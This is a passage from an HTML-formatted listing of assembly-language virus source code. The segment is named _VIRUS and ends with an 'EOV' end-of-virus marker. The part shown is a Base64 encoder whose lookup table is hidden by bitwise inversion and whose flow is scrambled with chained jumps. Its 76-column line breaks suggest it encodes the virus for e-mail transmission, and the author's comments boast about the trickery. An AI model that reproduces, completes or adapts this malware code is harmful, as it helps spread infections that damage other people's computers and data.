  </span><span class="sc5">@@trans</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">chars</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">trans_table</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;crazy, isnt? ;)</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">       </span><span class="sc1">;now, imagine what i can do if i wasnt stoned all time</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">cdq</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">chars</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">trans_table</span><span class="sc4">)-</span><span class="sc2">3</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">;tricky ;)</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc5">@@loop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                              </span><span class="sc1">;edx=original</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;edx=work copy</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CODE64Block3</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CODE64Block4</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@loop</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">              </span><span class="sc1">;get rest</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@rest1</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                            </span><span class="sc1">;use only 2 bytes</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CODE64Block3</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@end</span><span class="sc0">
   </span><span class="sc5">@@rest1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                            </span><span class="sc1">;use 1 byte only</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">@@end</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'='</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
   </span><span class="sc5">@@done</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0D0A0Dh</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">chars</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">trans_table</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@2</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;edi=buffer</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">;ecx=size</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">BASE64</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">Temp</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CODE64Block1</span><span class="sc0">                </span><span class="sc1">;little optimizing routine</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CODE64Block2</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Temp</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">CODE64Block1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
  </span><span class="sc5">process3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">process</span><span class="sc0">

</span><span class="sc5">CODE64Block2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
  </span><span class="sc5">process2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                        </span><span class="sc1">;chained jmps</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">process3</span><span class="sc0">             </span><span class="sc1">;another "why make it easy?" (c) Vecna ;)</span><span class="sc0">

</span><span class="sc5">CODE64Block3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">process2</span><span class="sc0">

</span><span class="sc5">CODE64Block4</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">

  </span><span class="sc5">process</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
       </span><span class="sc6">xlatb</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">chars</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">trans_table</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">chars</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">trans_table</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0000004Ch</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">cdq</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@noline</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0Dh</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
   </span><span class="sc5">@@noline</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">


</span><span class="sc5">vend</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'EOV'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_VIRUS</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">    </span><span class="sc5">main</span><span class="sc0">
</span></div></body>
</html>
